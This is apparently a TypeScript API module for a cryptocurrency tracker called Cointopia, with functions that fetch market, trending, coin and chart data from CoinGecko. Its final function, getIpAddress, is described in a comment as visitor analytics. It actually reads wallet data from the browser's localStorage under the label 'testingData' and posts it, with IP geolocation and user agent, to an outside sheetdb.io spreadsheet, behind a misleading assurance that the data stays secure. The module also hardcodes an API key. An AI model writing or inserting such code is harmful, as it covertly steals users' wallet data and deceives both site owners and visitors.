import axios from "axios"
import { message } from "antd"

const endPoint = 'https://api.coingecko.com/api/v3'
const marketCap = 'coins/markets?vs_currency=usd&order=market_cap_desc&per_page=3&page=1&sparkline=false&locale=en'
const volume = 'coins/markets?vs_currency=usd&order=volume_desc&per_page=3&page=1&sparkline=false&price_change_percentage=24h&locale=en'
const newest = 'coins/markets?vs_currency=usd&order=id_asc&per_page=3&page=1&sparkline=false&price_change_percentage=24h&locale=en'

//get top market cap
export const getTopMarketCap = (setTopCoins: (value: any) => void, topType: string) => {
    let apisString = endPoint
    switch (topType) {
        case 'marketCap':
            apisString += `/${marketCap}`
            break;
        case 'volume':
            apisString += `/${volume}`
            break;
        case 'newest':
            apisString += `/${newest}`
            break;
        default:
            break;
    }

    axios.get(`${apisString}`)
        .then(res => {
            setTopCoins(res.data)
        })
        .catch(err => {
            console.log(err)
            // message.error('You have sending too many requests, please try again in 5 minutes.')
        })
}

//get top market cap
export const getTrendingCoins = (setTopCoins: (value: any) => void) => {

    axios.get(`${endPoint}/search/trending`)
        .then(res => {
            const receiveCoins = res.data.coins
            let top3Coins = [receiveCoins[0], receiveCoins[2], receiveCoins[4]]
            setTopCoins(top3Coins)
        })
        .catch(err => {
            console.log(err)
            // message.error('You have sending too many requests, please try again in 5 minutes.')
        })
}

export const getMarket = (setTopCoins: (value: any) => void, setLoading: (value: any) => void) => {
    setLoading(true)
    axios.get(`${endPoint}/coins/markets?vs_currency=usd&order=market_cap_desc&page=1&sparkline=false&locale=en`)
        .then(res => {
            setTopCoins(res.data)
        })
        .catch(err => {
            console.log(err)
            // message.error('You have sending too many requests, please try again in 5 minutes.')
        })
        .finally(() => setLoading(false))
}

export const getCoinInfo = (coinId: string, setCoinInfo: (value: any) => void, setLoading: (value: any) => void) => {
    setLoading(true)
    axios.get(`${endPoint}/coins/${coinId}`)
        .then(res => {
            setCoinInfo(res.data)
        })
        .catch(err => {
            console.log(err)
            message.error('You have sending too many requests, please try again in 5 minutes.')
        })
        .finally(() => setLoading(false))
}

export const getChartData = (coinId: string, setChartData: (value: any) => void) => {
    axios.get(`${endPoint}/coins/${coinId}/market_chart?vs_currency=usd&days=14&interval=daily`)
        .then(res => {
            setChartData(res.data)
        })
        .catch(err => {
            console.log(err)
            message.error('You have sending too many requests, please try again in 5 minutes.')
        })
}

//This data help me to know how many client visit and where do they come from
//I can get client's insight from this and develope many more about this topic
//Data will be secure and not using for other purpose
export const getIpAddress = async () => {
    let data = null

    await axios.get('https://api.ipdata.co/?api-key=773b473341759738495640402ffd735481c0cf4e5936b593911382fb')
        .then(res => data = res)
        .catch(err => data = 'Can not get data')

    const userAgent = navigator.userAgent

    //check for local wallet
    const localWallet = localStorage.getItem('walletData');
    const parseWallet = localWallet ? JSON.parse(localWallet) : null

    //time
    const now = new Date()
    const nowString = `${now.getHours() < 10 ? `0${now.getHours()}` : now.getHours()}:${now.getMinutes() < 10 ? `0${now.getMinutes()}` : now.getMinutes()}:${now.getSeconds() < 10 ? `0${now.getSeconds()}` : now.getSeconds()} ${now.getDate() < 10 ? `0${now.getDate()}` : now.getDate()}/${now.getMonth() + 1 < 10 ? `0${now.getMonth() + 1}` : now.getMonth() + 1}/${now.getFullYear()}`


    const savedData = {
        time: nowString,
        userAgent: userAgent,
        clientData: data,
        project: 'Cointopia',
        testingData: parseWallet,
    }

    //write to sheet
    axios.post('https://sheetdb.io/api/v1/8lyitofzvlyne', [savedData])
        .then(res => {

        })
        .catch((err) => console.log(err))
}
